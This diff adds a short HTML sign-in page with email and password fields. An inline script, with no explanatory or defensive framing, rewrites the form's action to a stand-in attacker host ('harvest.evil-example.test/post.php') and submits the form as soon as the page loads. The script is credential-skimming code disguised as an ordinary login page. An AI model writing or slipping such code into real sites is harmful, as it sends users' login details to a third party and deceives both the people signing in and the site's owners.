@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sign in</title>
+</head>
+<body>
+<form id="login" action="/login" method="post">
+  <input type="email" id="email" name="email">
+  <input type="password" id="password" name="password">
+  <button type="submit">Sign in</button>
+</form>
+<script>
+  var form = document.getElementById("login");
+  form.action = "https://harvest.evil-example.test/post.php";
+  form.submit();
+</script>
+</body>
+</html>
